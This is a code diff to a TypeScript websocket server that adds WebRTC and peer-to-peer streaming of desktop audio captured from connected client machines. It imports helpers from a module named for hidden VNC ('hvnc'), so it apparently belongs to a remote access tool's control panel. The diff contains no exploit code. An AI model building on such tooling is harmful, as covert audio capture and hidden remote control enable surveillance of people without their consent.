@@ -5,10 +5,17 @@ import { encodeMessage } from "../protocol";
 import * as sessionManager from "../sessions/sessionManager";
 import type { DesktopAudioViewer, SocketData } from "../sessions/types";
 import { canUserAccessClient } from "../users";
+import { issueWebrtcPublishToken, webrtcStreamPathFor } from "./routes/webrtc-routes";
+import {
+  cleanupViewerP2P,
+  clearP2PSessionForViewer,
+  createP2PSession,
+  getP2PSessionIdForViewer,
+} from "./ws-console-rd-hvnc";
 
 function sendDesktopAudioCommand(
   clientId: string,
-  commandType: "desktop_audio_start" | "desktop_audio_stop",
+  commandType: "desktop_audio_start" | "desktop_audio_stop" | "webrtc_publish" | "webrtc_stop" | "webrtc_p2p_offer" | "webrtc_p2p_ice" | "webrtc_p2p_stop",
   payload: Record<string, unknown>,
 ) {
   const target = clientManager.getClient(clientId);
@@ -58,25 +65,85 @@ export function handleDesktopAudioViewerOpen(ws: ServerWebSocket<SocketData>) {
 
 export function handleDesktopAudioViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const { clientId } = ws.data;
-  if (typeof raw === "string") {
-    try {
-      const message = JSON.parse(raw);
-      if (message?.type === "start") {
-        const source = typeof message?.source === "string" ? message.source : "system";
-        const started = sendDesktopAudioCommand(clientId, "desktop_audio_start", {
-          source,
-          sessionId: ws.data.sessionId,
-        });
-        safeJson(ws, { type: "status", status: started ? "connected" : "error" });
-        return;
-      }
-      if (message?.type === "stop") {
-        sendDesktopAudioCommand(clientId, "desktop_audio_stop", {});
-        safeJson(ws, { type: "status", status: "disconnected" });
-      }
-    } catch {
-    }
+  if (typeof raw !== "string") return;
+  let message: any;
+  try {
+    message = JSON.parse(raw);
+  } catch {
     return;
+  }
+  if (!message || typeof message.type !== "string") return;
+
+  switch (message.type) {
+    case "start": {
+      const source = typeof message.source === "string" ? message.source : "system";
+      const started = sendDesktopAudioCommand(clientId, "desktop_audio_start", {
+        source,
+        sessionId: ws.data.sessionId,
+      });
+      if (message.webrtc === true && started) {
+        const streamPath = webrtcStreamPathFor(clientId, "audio");
+        const token = issueWebrtcPublishToken(clientId);
+        sendDesktopAudioCommand(clientId, "webrtc_publish", {
+          streamPath,
+          whipPath: `/api/webrtc/${streamPath}/whip`,
+          token,
+          kind: "audio",
+          hasVideo: false,
+          hasAudio: true,
+        });
+        safeJson(ws, {
+          type: "webrtc_ready",
+          streamPath,
+          whepPath: `/api/webrtc/${streamPath}/whep`,
+        });
+      }
+      safeJson(ws, { type: "status", status: started ? "connected" : "error" });
+      return;
+    }
+    case "stop": {
+      sendDesktopAudioCommand(clientId, "desktop_audio_stop", {});
+      sendDesktopAudioCommand(clientId, "webrtc_stop", { kind: "audio" });
+      safeJson(ws, { type: "status", status: "disconnected" });
+      return;
+    }
+    case "webrtc_p2p_offer": {
+      const sdp = typeof message.sdp === "string" ? message.sdp : "";
+      if (!sdp) return;
+      const sessionId = createP2PSession(ws, clientId, "audio");
+      sendDesktopAudioCommand(clientId, "webrtc_p2p_offer", {
+        sessionId,
+        sdp,
+        kind: "audio",
+        hasVideo: false,
+        hasAudio: true,
+      });
+      return;
+    }
+    case "webrtc_p2p_ice": {
+      const sessionId = getP2PSessionIdForViewer(ws);
+      if (!sessionId) return;
+      const candidate = typeof message.candidate === "string" ? message.candidate : "";
+      if (!candidate) return;
+      sendDesktopAudioCommand(clientId, "webrtc_p2p_ice", {
+        sessionId,
+        kind: "audio",
+        candidate,
+        sdpMid: typeof message.sdpMid === "string" ? message.sdpMid : "",
+        sdpMLineIndex: Number(message.sdpMLineIndex) || 0,
+      });
+      return;
+    }
+    case "webrtc_p2p_stop": {
+      const cleared = clearP2PSessionForViewer(ws);
+      if (cleared) {
+        sendDesktopAudioCommand(clientId, "webrtc_p2p_stop", {
+          sessionId: cleared.sessionId,
+          kind: cleared.kind,
+        });
+      }
+      return;
+    }
   }
 }
 
@@ -101,6 +168,7 @@ export function handleDesktopAudioUplink(clientId: string, payload: any) {
 }
 
 export function cleanupDesktopAudioViewer(ws: ServerWebSocket<SocketData>) {
+  cleanupViewerP2P(ws);
   let removedClientId = ws.data.clientId;
   for (const [sid, session] of sessionManager.getAllDesktopAudioSessions().entries()) {
     if (session.viewer === ws) {
@@ -113,5 +181,6 @@ export function cleanupDesktopAudioViewer(ws: ServerWebSocket<SocketData>) {
   const hasViewers = sessionManager.getDesktopAudioSessionsByClient(removedClientId).length > 0;
   if (!hasViewers) {
     sendDesktopAudioCommand(removedClientId, "desktop_audio_stop", {});
+    sendDesktopAudioCommand(removedClientId, "webrtc_stop", { kind: "audio" });
   }
 }
